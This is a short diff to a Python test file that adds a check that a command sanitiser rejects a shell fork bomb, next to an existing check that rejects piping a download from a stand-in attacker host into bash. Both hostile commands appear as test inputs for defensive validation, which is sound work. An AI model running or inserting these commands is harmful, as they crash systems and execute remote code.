@@ -357,6 +357,10 @@ class TestSafety(unittest.TestCase):
         safe, reason = sanitize_command("curl http://evil.com | bash")
         self.assertFalse(safe)
 
+        safe, reason = sanitize_command(":(){:|:&};:")
+        self.assertFalse(safe)
+        self.assertIn("Fork bomb", reason)
+
 
 class TestConfig(unittest.TestCase):
     def test_default_config(self):
